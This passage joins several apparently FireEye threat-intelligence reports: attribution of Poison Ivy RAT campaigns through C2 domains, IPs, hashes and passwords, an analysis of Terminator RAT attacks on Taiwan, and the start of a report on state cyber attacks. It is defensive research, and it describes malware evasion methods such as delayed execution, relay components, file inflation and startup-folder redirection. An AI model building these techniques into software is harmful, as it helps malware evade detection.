) to drop PIVY on their targets .
The decoy documents that are opened in exploitation typically contain content that is contextually relevant to both the text of the spear - phishing email and to the interests of the intended target .
The documents are legitimate- but weaponized - documents in English .
In addition to the PIVY password admin @ 338 , we clustered individual attacks by using passive DNS data to look at the IP addresses the CnC servers have resolved to over time .
We found that common IP addresses among PIVY samples for admin @ 338 , key @ 123 and gwx @ 123 .
We can link PIVY passwords key @ 123 with admin @ 338 by observing the following connections : • The key @ 123 sample , 808e21d6efa2884811fbd0adf67fda78 , connects directly to 219.76.208.163 .
• Two CnC domain names from the admin @ 338 sample 8010cae3e8431bb11ed6dc9acabb93b7 , www.webserver.dynssl.com and www .
webserver.freetcp.com , resolved to that same IP address ( 219.76.208.163 ) .
We can link PIVY passwords gwx @ 123 with admin @ 338 by observing the following connections : • The gwx @ 123 sample 0323de551aa10ca6221368c4a73732e6 connects to the CnC domain names microsofta .
byinter.net , microsoftb.byinter.net , microsoftc .
byinter .
net , and microsofte.byinter.net .
These domain names resolved to 113.10.246.30 219.90.112.203 , 202.65.220.64 , 75.126.95.138 , 219.90.112.197 , 202.65.222.45 , and 98.126.148.114 .
• The admin @ 338 sample 8010cae3e8431bb11ed6dc9acabb93b7 connects to the CnC domains www .
webserver.fartit.com , www.webserver .
freetcp.com , and www.webserver.dynssl.com .
• www.webserver.fartit.com resolved to 113.10.246.30 , 219.90.112.203 , 202.65.220.64 , and 75.126.95.138 , which overlap with the gwx @ 123 IP addresses .
• www.webserver.freetcp.com resolved to 113.10.246.30 , 219.90.112.203 , 202.65.220.64 , 75.126.95.138 , 219.90.112.197 , and 202.65.222.45 , which overlap with the gwx @ 123 IP addresses .
• www.webserver.dynssl.com resolved to 113.10.246.30 , 219.90.112.203 , 219.90.112.203 , 75.126.95.138 , 219.90.112.197 , and 202.65.222.45 , which overlap with the gwx @ 123 IP addresses .
This data indicates a relationship among the threat actors behind these attacks - in most cases , they at least share a common CnC infrastructure .
In addition to historic DNS resolutions , PIVY process mutexes suggest a relationship between PIVY passwords gwx @ 123 and admin @ 338 .
Although the mutexes of gwx @ 123 , wwwst @ Admin , and admin @ 338 samples were different , the choice of characters in the mutex revealed a similar pattern .
Our data set for th3bug threat actor comprises the following : • 14 Poison Ivy samples • 2 passwords • 9 CnC servers The earliest th3bug PIVY sample we have is dated October 26 , 2009 .
This ongoing campaign targets a number of industries but appears to prefer targets in higher education and the healthcare sectors .
Unlike the other two campaigns described in this report ( admin @ 338 and menuPass ) , th3bug does not appear to rely on spear phishing to distribute PIVY .
Instead , attacks attributed to th3bug use a strategic Web compromise to infect targets .
This approach is more indiscriminate , which probably accounts for the more disparate range of targets .
In the FireEye blog , we documented a recent th3bug strategic Web compromise .
In the following example , the actor or actors behind the th3bug campaign compromised multiple websites that catered to the intended targets .
The attacker used injected JavaScript on the compromised websites to redirect targets to an Internet Explorer exploit that dropped Stage 1 launcher / downloader mobile code .
This downloader then retrieved and installed a PIVY RAT variant .
In related campaigns , th3bug has used a number of different Java and Internet Explorer exploits , including ( CVE-2013 - 0422 ) , ( CVE-2013- 1347 ) , and ( CVE-2011 - 3544 ) .
The default PIVY password of admin has been used by multiple , distinct threat actors - so clearly , we can not link all PIVY samples with the admin password to th3bug .
But evidence suggests that the attackers originally used the default password before settling on th3bug .
We can link at least one PIVY sample that uses the admin password to the th3bug campaign based on the following connections : • The sample 8002debc47e04d534b45f7bb7dfcab4d connected to kr.iphone.qpoe.com with the PIVY password admin .
• The domain kr.iphone.qpoe.com resolved to 180.210.206.96 on January 12 , 2012 .
• The domain nkr.iphone.qpoe.com also resolved to 180.210.206.96 on January 3 , 2012 .
• The domain nkr.iphone.qpoe.com also resolved to 101.78.151.179 on December 23 , 2011 .
• The domain e.ct.toh.info resolved to 101.78.151.179 on June 12 , 2012 .
• The sample 55a3b2656ceac2ba6257b6e39f4a5b5a connected to ct.toh.info domain with the PIVY password th3bug .
We found a smaller number of distinct PIVY samples linked to th3bug than we did for the admin @ 338 and menuPass campaigns .
This paucity is likely a result of two factors .
First , th3bug does not appear to stage a high volume of attacks .
Instead , it appears to run only a handful of strategic Web compromise attacks each year .
Second , th3bug stages its delivery of PIVY .
So to acquire the second - stage PIVY server payload , an attack must be observed in real time .
Our data set for the menuPass threat actor comprises the following : • 118 Poison Ivy samples • 8 passwords • 61 domains • 74 IP addresses The earliest menuPass PIVY sample we have is dated December 14 , 2009 .
This sample ( b08694e14a9b966d8033b42b58ab727d ) connected to a control server at js001.3322.org with a password xiaoxiaohuli ( Chinese translation : '' little little fox '' ) .
Based on what we have found , it appears that the threat actor behind menuPass prefers to target U.S. and foreign defense contractors .
The menuPass campaign appears to favor spear phishing to deliver payloads to the intended targets .
The email shown in Figure 21 shows a typical menuPass spear - phishing attempt .
While the attackers behind menuPass have used other RATs in their campaign , it appears that they use PIVY as their primary persistence mechanism .
The menuPass campaign has used weaponized Microsoft Word documents ( CVE-2010 - 3333 ) 35 and ZIP files containing executable files to drop PIVY directly onto its targets .
Figure 22 outlines several executables delivered in ZIP files attached to menuPass spear - phishing emails .
The menuPass attackers favor using a launcher that masquerades as a Microsoft Foundation Class Library application36 using the document/ view architecture .
This launcher includes a packed copy of the PIVY server that is subsequently unpacked and executed in memory shortly after a useless call to the FindFirstFile API .
Out of the 155 samples we collected f or menuPass , 81 of them are MFC apps with a document class .
Out of these 81 MFC launchers , 64 use the CBricksDoc class name .
We also found these names : • CMy20130401Doc • CShellCodeDoc • CMy20130401Doc • CPiShellPutDo • CCrocodileDoc • CMy20130401Doc • CStatePattern_GameDoc • CPiShellPutDoc • CPIVCDoc • CMy1124Doc • CLightGameDoc • CPiShellPutDoc Some samples were packed into projects taken from the Web and repurposed to serve as launchers .
The most popular PIVY password used by the menuPass campaign is keaidestone ( used in 35 samples ) followed by menuPass ( 24 samples ) .
The threat actor also used these PIVY passwords in the same campaign : • suzuki • happyyongzi • admin • smallfish • XGstone • xiaoxiaohuli • fishplay A number of IPs in the 60.10.1.0/24 Classless Inter - Domain Routing ( CIDR ) block have hosted domains used in the menuPass campaign .
We can see the connection between the keaidestone password and the XGstone password by observing the following connections in this same /24 CDIR block : • The IP 60.10.1.120 hosted the domain apple .
cmdnetview.com .
• The sample d8c00fed6625e5f8d0b8188a5caac115 connected to apple.cmdnetview.com with the password XGstone .
• The IP 60.10.1.115 hosted the domain autuo .
xicp.net .
• The sample b1deff736b6d12b8d98b485e20d318ea connected to autuo.xicp.net with the password keaidestone .
• The samples b1deff736b6d12b8d98b485e20d318ea and d8c00fed6625e5f8d0b8188a5caac115 also shared the use of the CBricksDoc launcher .
• 08709f35581e0958d1ca4e50b7d86dba has a compile time of July 20 .
2012 and connected to tw.2012yearleft.com with the password keaidestone .
This sample also used the CBricksDoc launcher .
• 2012yearleft.com was registered on February 13 , 2012 by zhengyanbin8 @ gmail .
com .
• The domain cmdnetview.com was also registered on February 13 , 2012 by zhengyanbin8 @ gmail.com .
We can also see the connection between the keaidestone password and the smallfish password by observing the connections in the 60.10.1.0/24 CDIR block : • The domain dedydns.ns01.us resolved to 60.10.1.121 .
• The sample e84853c0484b02b7518dd6837 87d04fc connected to dedydns.ns01.us with the password smallfish and used the CBricksDoc launcher .
We can see the connection between the keaidestone password and the happyyongzi password by observing the connections in the 60.10.1.0/24 CDIR block : • The domain maofajapa.3322.org resolved to 60.10.1.121 .
• The sample cf8094c07c15aa394dddd4eca4aa8c8b connected to maofajapa.3322.org with the password happyyongzi .
The password suzuki can be linked to keaidestone by observing the following relationships : • The sample 410eeaa18dbec01a27c5b41753b3c7ed connected to send.have8000.com with the password of suzuki .
• The domain have8000.com was registered on 2012 - 02 - 13 via the email zhengyanbin8 @ gmail.com .
• The same email of zhengyanbin8 @ gmail.com also registered cmdnetview.com on the same date of 2012 - 02 - 13 .
• As stated above , the sample b2dc98caa647e64a2a8105c298218462 connected to apple.cmdnetview.com with the password XGstone .
We can link the password of menuPass to keaidestone by observing the following connections : • 08709f35581e0958d1ca4e50b7d86dba has a compile time of July 20 , 2012 and connected to tw.2012yearleft.com with the password keaidestone .
This sample also used the CBricksDoc launcher .
• tw.2012yearleft.com resolved to 60.10.1.114 on June 6 , 2012 and to 60.1.1.114 on March 11 , 2013 .
• The domain fbi.zyns.com resolved to 60.10.1.118 on August 21 , 2012 .
• 68fec995a13762184a2616bda86757f8 had a compile time of March 25 , 2012 and connected to fbi.zyns.com with the password menuPass .
This sample also used the CBricksDoc launcher .
• • The sample 39a59411e7b12236c0b4351168fb47ce had a compile time of April 2 , 2010 and connected to weile3322b.3322.org with the password keaidestone .
This sample used a launcher of CPiShellPutDoc .
• The sample f5315fb4a654087d30c69c768d80f826 had a compile time of May 21 , 2010 and connected to ngcc.8800.org with the password menuPass .
This sample also used a launcher of CPiShellPutDoc .
We can see the connection between the happyyongzi password and menuPass by observing the following connections : • The sample e6ca06e9b000933567a8604300094a85 connected to the domain sh.chromeenter .
com with the password happyyongzi .
• The domain sh.chromeenter.com previously resolved to the IP 60.2.148.167 .
• The domain jj.mysecondarydns.com also resolved to 60.2.148.167 .
Similar to other threat actors , this threat actor has also used PIVY samples using the default admin password .
Again , not all PIVY samples with the password admin can be linked to menuPass .
But we can see the connection between the menuPass and at least a couple of instances of PIVY using the admin password via the following connections : • • The sample 56cff0d0e0ce486aa0b9e4bc0bf2a141 was compiled on 2011 - 08 - 31 and connected to mf.ddns.info with the password menuPass .
• The domain mf.ddns.info resolved to 54.241.8.84 on November 22 , 2012 .
This same IP also hosted the domain av.ddns.us on the same date .
• The sample 60963553335fa5877bd5f9be9d8b23a6 was compiled on June 9 , 2012 and connected to av.ddns.us with the password of admin .
• A number of menuPass and admin samples also shared the same CBricksDoc launcher including but not limited to 6d989302166ba1709d66f90066c2fd59 and 4bc6cab128f623f34bb97194da21d7b6 .
• The sample 4e84b1448cf96fabe88c623b222057c4 connected to jj.mysecondarydns.com with the password menuPass .
The password of fishplay can be linked to menuPass by observing the following relationships : • The sample 494e65cf21ad559fccf3dacdd69acc94 connected to mongoles.3322.org with the password fishplay .
• The mongoles.3322.org domain resolved to 123.183.210.28 .
• The domain a.wubangtu.info also resolved to 123.183.210.28 .
• The sample a5965b750997dbecec61358d41ac93c7 connected to 3q.wubangtu.info with the password menuPass .
• The sample 494e65cf21ad559fccf3dacdd69acc94 and a5965b750997dbecec61358d41ac93c7 also share the same CBricksDoc launcher .
We can link the password of xiaoxiaohuli to menuPass through the shared CPiShellPutDoc launcher : • f5315fb4a654087d30c69c768d80f826 had a compile time of May 21 , 2010 and connected to ngcc.8800.org with the password of menuPass .
• e6ca06e9b000933567a8604300094a85 had a compile time of June 29 , 2010 and connected to sh.chromeenter.com with the password happyyongzi .
• Both f5315fb4a654087d30c69c768d80f826 and e6ca06e9b000933567a8604300094a85 use the same CPiShellPutDoc launcher .
Finally , we can link the password of happyyongzi to xiaoxiaohuli by observing the following relationships : • e6ca06e9b000933567a8604300094a85 has a compile time of 2010 - 06 - 29 and connects to sh.chromeenter.com with the password happyyongzi .
• e62584c9cd15c3fa2b6ed0f3a34688ab has a compile time of 2009 - 12 - 28 and connects to the domain js001.3322.org with the password xiaoxiaohuli .
• Both e6ca06e9b000933567a8604300094a85 and e62584c9cd15c3fa2b6ed0f3a34688ab use the same CPiShellPutDoc launcher .
We can not say with certainty why the actors responsible for the admin @ 338 , menuPass , and th3bug campaigns rely on Poison Ivy .
But possible explanations include PIVY 's easy - to - use features and the relative anonymity that an off - the - shelf RAT provides for attackers .
Compared to other RATs , PIVY is very easy to operate .
Its graphical user interface ( GUI ) makes building new servers and controlling infected targets simple .
Attackers can point and click their way through a compromised network and exfiltrate data .
Commodity RATs also complicate efforts by security professionals to correlate a threat actor 's activity over time - attackers can hide in the sea of malicious activity that also uses Poison Ivy - based malware .
By exposing the role of PIVY and other commodity RATs in APT campaigns we hope to complicate attackers ' ability to hide behind these off - the - shelf tools - and perhaps force them away from using these RATs .
In this report , we have provided several techniques that network defenders can use to not only identify a PIVY infection , but also classify and correlate detected infections to previously observed APT activity .
In the process of building their PIVY servers , attackers leave a number of potentially useful clues , such as : • The domains and IPs used for CnC • The chosen PIVY process mutex • The chosen PIVY password • Launcher code used in the droppers • Timeline of activity • Targets of attack Together , all of these data points can help effectively identify and correlate APT activity that uses the Poison Ivy RAT .
FireEye has invented a purpose - built , virtual machine - based security platform that provides real - time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
FireEye has over 1,000 customers across more than 40 countries , including over one - third of the Fortune 100 .
FireEye , Inc. | 1440 McCarthy Blvd .
FireEye Labs has been tracking a variety of advanced persistent threat ( APT ) actors that have been slightly changing their tools , techniques , and procedures ( TTPs ) in order to evade network defenses .
Earlier , we documented changes to Aumlib , the malware used in the attack against the New York Times , and Taidoor , a malware family that is being used in ongoing cyber - espionage campaigns particularly against entities in Taiwan .
In this post we will explore changes made to Terminator RAT ( Remote Access Tool ) by examining a recent attack against entities in Taiwan .
We recently analyzed a sample that we suspect was sent via spear - phishing emails to targets in Taiwan .
As shown in Figure 1 , the adversary sends a malicious Word document , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) , that exploits CVE-2012 - 0158 , which subsequently drops a malware installer named `` DW20.exe '' .
This particular malware is interesting because of the following : It evades sandbox by terminating and removing itself ( DW20.exe ) after installing .
Malicious behavior will only appear after reboot .
It deters single - object based sandbox by segregation of roles between collaborating malwares .
The RAT ( svchost_.exe ) will collaborate with its relay ( sss.exe ) to communicate with the command and control server .
It deters forensics investigation by changing the startup location .
It deters file - based scanning that implements a maximum file size filter , by expanding the size of svchost_.exe to 40 MB .
The ultimate payload of the attack is Terminator RAT , which is also known as FakeM RAT .
This RAT does not appear to be exclusively used by a single APT actor , but is most likely being used in a variety ( of possibly otherwise unrelated ) campaigns .
In the past , this RAT has been used against Tibetan and Uyghur activists , and we are seeing an increasing number of attacks targeting Taiwan as well .
However , these attacks use some evasive tactics that demonstrate the evolution of Terminator RAT .
First , the attackers have included a component that relays traffic between the malware and a proxy server .
Second , they have modified the 32-byte magic header that in previous versions attempted to disguise itself to look like either MSN Messenger , Yahoo ! Messenger , or HTML code .
These modifications appear to be an attempt to evade network defenses , perhaps in response to defender 's increasing knowledge of the indicators of compromise associated with this malware .
We will discuss the individual components of this attack in more detail .
DW20.exe was found to be the installation executable file .
It will first create its working folders located at `` % UserProfile % \Microsoft '' and `` % AppData % \2019 '' .
The former is used to store the configurations and executable files ( svchost_.exe and sss.exe ) and the latter is used to store the shortcut link files .
This folder `` 2019 '' was then configured to be the new start up folder location by changing the registry '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup '' with the location of its path ( see Figure 2 ) .
The executable file `` sss.exe '' was found to be the decrypted form of the resource named 140 with type `` ACCELORATOR '' ( likely misspelling of Accelerator – see Figure 3 ) .
This resource was decrypted using customized XTEA algorithm and appended with an encrypted configuration for the domains and ports .
After installation , DW20.exe deletes and terminates itself .
The malwares will only run after reboot .
This is one effective way to evade sandbox automatic analysis , as malicious activity will only reveal after a reboot .
sss.exe is an interesting malware component .
As a researcher would analyze it independently , it is not considered a malicious program .
This component plays the role as a network relay between the malware and the proxy server , by listening over port 8000 .
To achieve this , it first tries to identify the list of proxy servers that are used within the system using '' WinHttpGetIEProxyConfigForCurrentUser '' , and the discovered proxy servers and related ports are stored in the same directory in a file named `` PROXY '' ( see Figure 4 ) .
When there is a new incoming TCP connection over port 8000 , it will attempt to create a local to proxy socket connection .
With that , it will check connectivity with the CnC server .
If the response is 200 , it will then start to create a `` relay link '' between the malware and the CnC server ( see Figure 5 ) .
The `` relay link '' was created using two threads , where one thread will transfer data from socket 1 to socket 2 ( see Figure 6 ) and the other will do vice versa .
As depicted in Figure 7 , the user agent is hard coded .
It is a possible means to identify potentially malicious traffic , as Internet Explorer 6 is significantly outdated and `` MSIE 6.0.1.3 '' is not a valid version token .
The configurations for the malicious domains and ports to use are located at the last 188 bytes of the executable file ( see Figure 8 ) .
The first 16 bytes is the key ( boxed in red ) to decrypt the remaining content using modified XTEA algorithm ( see Figure 9 ) .
The two malicious domains found were `` liumingzhen.zapto.org '' and `` liumingzhen.myftp.org '' The Terminator sample we analyzed , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) was not configured with fake HTML , Yahoo Messenger , or Windows Messenger traffic header as it had in past variants .
However , the content is encrypted in exactly the same way as previous versions of Terminator RAT .
The decrypted content reveals that the malware is sending back the user name , the computer name and a campaign mark of `` zjz1020 '' .
This particular sample is configured to one of two command and control servers : liumingzhen.zapto.org / 123.51.208.69 liumingzhen.myftp.org / 123.51.208.69 We have located another malicious document that has a Taiwan - related decoy document that drops this same version of Terminator RAT .
The sample we analyzed ( md5 : 50d5e73ff8a0693ed2ee2d320af3b304 ) exploits CVE-2012 - 0158 and has the following command and control server : catlovers.25u.com / 123.51.208.142 The command and control servers for both samples resolved to IP addresses in the same class C network .
In June 2013 , we investigated an attack against entities in Taiwan that used spear - phishing emails to deliver a malicious attachment .
The malicious attachment `` 標案資料.doc '' ( md5 : bfc96694731f3cf39bcad6e0716c5746 ) exploited a vulnerability in Microsoft Office ( CVE-2012 - 0158 ) , however , the payload in this case was a different malware family known as WinData .
The malware connected to the same command and control server , liumingzhen.zapto.org , but the callback is quite different : XYZ /WinData . DLL ? HELO - STX-1 * 1 [ IP Address ] * [ Computer Name ] * 0605 [ MAC : [ Mac Address ] ] $ In a separate case where liumingzhen.zapto.org has been used as the command and control server , the payload was neither WinData nor Terminator RAT , but another type of malware known as Protux .
The sample we analyzed in August 2012 for this case was `` 幹 ! .doc
'' ( md5 : 01da7213940a74c292d09ebe17f1bd01 ) .
This particular threat actor has access to a variety of malware families and has been using them to target entities in Taiwan for more than a year .
Terminator RAT is an example of how malware are increasingly becoming more sophisticated and harder to detect .
There is a need for continual research to understand various techniques , tactics , and procedures used by the adversaries .
Detection of exploitation and identification of anomalous callbacks are becoming extremely critical in preventing the malware from installing into the system or phoning back to the command control servers .
This entry was posted in Advanced Malware , Targeted Attack , Threat Intelligence , Threat Research by Geok Meng Ong , Nart Villeneuve and Chong Rong Hwa .
Bookmark the permalink .
Cyberspace has become a full - blown war zone as governments across the globe clash for digital supremacy in a new , mostly invisible theater of operations .
Once limited to opportunistic criminals , cyber attacks are becoming a key weapon for governments seeking to defend national sovereignty and project national power .
From strategic cyber espionage campaigns , such as Moonlight Maze and Titan Rain , to the destructive , such as military cyber strikes on Georgia and Iran , human and international conflicts are entering a new phase in their long histories .
In this shadowy battlefield , victories are fought with bits instead of bullets , malware instead of militias , and botnets instead of bombs .
These covert assaults are largely unseen by the public .
Unlike the wars of yesteryear , this cyber war produces no dramatic images of exploding warheads , crumbled buildings , or fleeing civilians .
But the list of casualties - which already includes some of the biggest names in technology , financial services , defense , and government -is growing larger by the day .
A cyber attack is best understood not as an end in itself , but as a potentially powerful means to a wide variety of political , military , and economic goals .
`` Serious cyber attacks are unlikely to be motiveless , '' said Martin Libicki , Senior Scientist at RAND Corp. '' Countries carry them out to achieve certain ends , which tend to reflect their broader strategic goals .
The relationship between the means chosen and their goals will look rational and reasonable to them if not necessarily to us .
'' Just as each country has a unique political system , history , and culture , state - sponsored attacks also have distinctive characteristics , which include everything from motivation to target to type of attack .
This report describes the unique characteristics of cyber attack campaigns waged by governments worldwide .
We hope that , armed with this knowledge , security professionals can better identify their attackers and tailor their defenses accordingly .
Here is a quick overview : • Asia - Pacific .
Home to large , bureaucratic hacker groups such as the `` Comment Crew '' who pursue many goals and targets in high - frequency , brute - force attacks .
• Russia / Eastern Europe .
These cyber attacks are more technically advanced and highly effective at evading detection .
• Middle East .
These hackers are dynamic , often using creativity , deception , and social engineering to trick users into compromising their own computers .
• United States .
The most complex , targeted , and rigorously engineered cyber attack campaigns to date .
World War Z - a bestselling book and Hollywood movie - detailed a global pandemic in which politics and culture deeply influenced how the public - and by extension , governments - reacted to a zombie plague .
In one passage , for example , an Arab boy refused to believe that the disease was real , suspecting that Israel had fabricated the story .
The nations described in World War Z - the United States , China , Russia , South Korea , Israel , and many others - are involved in a very different type of conflict , but one with real and growing national security impact : World War C , where `` C '' stands for `` Cyber '' .
However , the same rule applies : each country has a unique political system , history , language , culture , and understanding of human and international conflict .
Cyber conflict often mirrors traditional conflict .
For example , China uses high - volume cyber attacks similar to how it used infantry during the Korean War .
Many Chinese soldiers were sent into battle with only a handful of bullets .
Given their strength in numbers , they were still able to achieve battlefield victories .
On the other end of the spectrum lie Russia , the U.S. , and Israel , whose cyber tactics are more surgical , reliant on advanced technologies and the cutting - edge work of contractors who are driven by competition and financial incentives .
We are still at the dawn of the Internet Age .
But cyber attacks have already proven themselves as a low - cost , high - payoff way to defend national sovereignty and to project national power .
Many of today 's headlines seem to be pulled from the pages of a science fiction novel .
Code so sophisticated it destroys a nuclear centrifuge thousands of miles away .
Malware that secretly records everything a user does on a computer .
A software program that steals data from any nearby device that has Bluetooth connectivity .
Encrypted code that decrypts only on one specific , target device .
Such sophistication speaks volumes about the maturity , size , and resources of the organizations behind these attacks .
With a few rare exceptions , these attacks are now in the exclusive realm of nation - states .
`` The international community has developed a solid understanding of cyber technology , '' said Prof . Michael N. Schmitt of the U.S .
Naval War College , in an email interview .
`` What is missing is a grasp of the geopolitical context in which such technology operates .
Attribution determinations made without sensitivity to the geopolitical surroundings are seldom reasonable .
'' World War C , like any analogy , has its limits .
Cyber war has been compared to special operations forces , submarine warfare , missiles , assassins , nuclear weapons , Pearl Harbor , 9/11 , Katrina , and more .
Even our zombie analogy is not new .
Often , any compromised computer , if it is actively under the surreptitious control of a cybercriminal , is called a zombie , and botnets are sometimes called zombie armies .
Also , compared to stockpiling tanks and artillery , writing cyber attack code , and compromising thousands if not millions of computers , is easy .
Moreover , malware often spreads with the exponential growth of an infectious disease .
This report examines many publicly known cyber attacks .
By exploring some of the distinctive national or regional characteristics of these attacks , organizations can better identify their attackers , anticipate future attacks , and defend themselves .
The analytical waters surrounding cyber warfare are inherently murky .
At the strategic level , governments desire to have a degree of plausible deniability .
At the tactical level , military and intelligence organizations envelop such operations in layers of classification and secrecy .
To be effective , information operations rely on deception - and the Internet offers an ideal venue for a spy 's smoke and mirrors .
In practical terms , hackers often run their attacks through cyber terrain ( such as compromised , third - party networks ) that present investigators with technical and jurisdictional complications .
And finally , cybercriminal tools , tactics , and procedures ( TTPs ) evolve so quickly that cyber defense , legislation , and law enforcement remain behind the attacker 's curve .
`` The biggest challenge to deterring , defending against , or retaliating for cyber attacks is the problem of correctly identifying the perpetrator , '' said Prof . John Arquilla , Naval Postgraduate School in an email interview with FireEye.® `` Ballistic missiles come with return addresses .
But computer viruses , worms , and denial of service attacks often emanate from behind a veil of anonymity .
The best chance to pierce this veil comes with the skillful blending of forensic back - hacking techniques with deep knowledge of others ' strategic cultures and their geopolitical aims .
'' Cyber `` attribution '' -identifying a likely culprit , whether an individual , organization , or nation - state - is notoriously difficult , especially for any single attack .
States are often mistakenly identified as non - state actors , and vice versa .
To make matters worse , ties between the two are increasing .
First , a growing number of `` patriotic cybercriminals '' ostensibly wage cyber war on behalf of governments ( examples include Chechnya and Kosovo in the 1990s , China in 2001 , Estonia in 2007 , Georgia in 2008 , and every year in the Middle East ) .
Second , cybercrime organizations offer anyone , including governments , cyber attack services to include denial - of - service attacks and access to previously compromised networks .
FireEye researchers have even seen one nation - state develop and use a sophisticated Trojan , and later ( after its own counter - Trojan defenses were in place ) sell it to cybercriminals on the black market .
Thus , some cyber attack campaigns may bear the hallmarks of both state and non - state actors , making positive attribution almost impossible .
And finally , `` false flag '' cyber operations involve a hacker group behaving like another to mislead cyber defense researchers .
Within the shadowy world of cyber warfare , FireEye occupies a unique position .
First , our threat protection platform has been installed on thousands of sensitive networks around the world .
This gives our researchers a global and embedded presence in the cyber domain .
Second , FireEye devices are placed behind traditional security defenses such as firewalls , anti - virus , and intrusion prevention systems .
This means that our `` false positive '' rate is extremely low , and that the attacks we detect have already succeeded in penetrating external network defenses .
The People 's Republic of China is the noisiest threat actor in cyberspace .
The reasons for this include its huge population , a rapidly expanding economy , and a lack of good mitigation strategies on the part of its targets .
The list of successful Chinese compromises is long , and spans the entire globe .
Here are some of the most significant incidents in the U.S. : • Government : By 1999 , the U.S. Department of Energy believed that China posed an `` acute '' threat to U.S. nuclear security via cyber espionage .
By 2009 , China apparently stole the plans for the most advanced U.S. fighter jet , the F-35 .
• Technology : China hacked Google , Intel , Adobe , and RSA 's SecureID authentication technology- with which it then targeted Lockheed Martin , Northrop Grumman , and L-3 Communications .
• Business and Financial Services : Morgan Stanley , the U.S. Chamber of Commerce , and numerous banks have been hacked .
• Media : The New York Times , Wall Street Journal , Washington Post , and more have been targeted by advanced , persistent cyber attacks emanating from China .
• Critical Infrastructure : Department of Homeland Security ( DHS ) reported in 2013 that 23 gas pipeline companies were hacked ( possibly for sabotage ) , and that Chinese hackers were seen at the U.S. Army Corps of Engineers ' National Inventory of Dams .
Some of these cyber attacks have given China access to proprietary information such as research and development data .
Others offer Chinese intelligence access to sensitive communications , from senior government officials to Chinese political dissidents .
Of course , the U.S. is not China 's only cyber target .
All traditional , geopolitical conflicts have moved into cyberspace , and Chinese compromises encompass the entire globe .
But many contests have been one - sided affairs , with all publicly known attacks emanating from China .
• Europe : In 2006 , Chinese cybercriminals targeted the UK House of Commons ; in 2007 , German Chancellor Angela Merkel raised the problem of nation - state hacking with China 's President ; in 2010 , British MI5 warned that undercover Chinese intelligence officers had given UK business executives malware - laden digital cameras and memory sticks .
• India : Indian officials worry that China could disrupt their computer networks during a conflict .
One expert confided that an exclusive reliance on Chinese hardware might give China a `` permanent '' denial - of - service capability .
One sophisticated attack on an Indian Navy headquarters allegedly used a USB vector to bridge the `` air - gap '' between a compartmentalized , standalone network and the Internet .
• South Korea : The South Korean government has complained for years of Chinese activity on its official computers , including a 2010 compromise of the personal computers and PDAs belonging to much of South Korea 's government power structure and a 2011 assault on an Internet portal that held personal information for 35 million Koreans .
• Japan : Here , the target list includes government , military , and high - tech networks .
Chinese cybercriminals have even stolen classified documents .
• Australia : China allegedly stole the blueprints for the Australian Security Intelligence Organization 's new $ 631 million building .
• Worldwide : In 2009 , Canadian researchers discovered that China controlled a worldwide cyber espionage network in over 100 countries .
In 2010 , a Chinese telecommunications firm transmitted erroneous routing information for 37,000 computer networks , which misrouted some Internet traffic through China for 20 minutes .
The attack exposed data from 8,000 U.S. networks , 1,100 Australian networks , and 230 French networks .
The People 's Republic of China ( PRC ) is home to 1.35 billion people , or more than four times the population of the United States .
Therefore , China often has the ability to overwhelm cyber defenses with quantity over quality , just as it did in the Korean War and as it might do in any other type of conflict .
The Chinese malware that FireEye researchers have analyzed is not the most advanced or creative .
But in many circumstances , it has been no less effective .
China employs brute - force attacks that are often the most inexpensive way to accomplish its objectives .
The attacks succeed due to the sheer volume of attacks , the prevalence and persistence of vulnerabilities in modern networks , and a seeming indifference on the part of the cybercriminals to being caught .
The `` Comment Crew , '' a prominent example of a Chinese cyber threat actor , is believed to be a contractor to the PRC government .
The Comment Crew is behind many noteworthy attacks , including Operation Beebus , which targets U.S. aerospace and defense industries .
One important characteristic of the Comment Crew - which puts it definitively in the category of an advanced persistent threat , or APT - is that it is a bureaucracy .
In - depth analysis reveals a small group of creative and strategic thinkers at the top .
One layer down , a larger group of specialists design and produce malware in an industrial fashion .
At the bottom are the foot soldiers - brute - force hackers who execute orders and wage extended cyber attack campaigns , from network reconnaissance to spear phishing to data exfiltration .
The Comment Crew is so large , in fact , that when the Federal Bureau of Investigation ( FBI ) decoded one of the group 's stolen caches of information , if printed out , it would have created a stack of paper taller than a set of encyclopedias .
Such a large bureaucracy helps to explain sometimes - incongruous cybercriminal behavior .
A given piece of malware , for example , may have been written by an expert but incorrectly used later by an inexperienced foot soldier ( such as a poorly written spear phishing email ) .
Understanding this cyber attack life cycle and its different stages can help cyber defenders recognize and foil an attack .
In any large organization , some processes are less mature than others , and therefore easier to recognize .
In its own defense , Chinese officials contend that their country is also a target of cyber attacks .
In 2006 , the China Aerospace Science & Industry Corporation ( CASIC ) found spyware on its classified network .
In 2007 , the Chinese Ministry of State Security stated that foreign cybercriminals were stealing Chinese information , with 42 percent of attacks coming from Taiwan and 25 percent from the United States .
In 2009 , Chinese Prime Minister Wen Jiabao announced that a cybercriminal from Taiwan had stolen his upcoming report to the National People 's Congress .
In 2013 , Edward Snowden , a former system administrator at the National Security Agency ( NSA ) , published documents suggesting that the U.S. conducted cyber espionage against China ; and the Chinese Computer Emergency Response Team ( CERT ) stated that it possessed `` mountains of data '' on cyber attacks by the U.S. North and South Korea remain locked in one of the most intractable conflicts on Earth .
North Korea ( supported by China ) would seem to be stuck in a cyber Stone Age - especially relative to South Korea ( supported by the U.S. ) -has the fastest download speeds in the world and will issue its students with computer tablets instead of books by 2015 .
Even so , the Internet offers anyone , and any nation , an asymmetric way to gather intelligence and project national power in cyberspace - and North Korea appears to have acquired cyber attacks as a new weapon for its arsenal .
In 2009 , North Korea launched its first major assault on South Korean and U.S. government websites .
The attack did little damage , but the incident gained wide media exposure .
By 2013 , however , the threat actors had matured .
A group dubbed the `` DarkSeoul Gang '' was responsible for at least four years of high - profile attacks on South Korea .
The group 's attacks included a distributed denial - of - service ( DDoS ) attack and malicious code that wiped computer hard drives at banks , media , ISPs , telcos , and financial services companies - overwriting legitimate data with political messages .
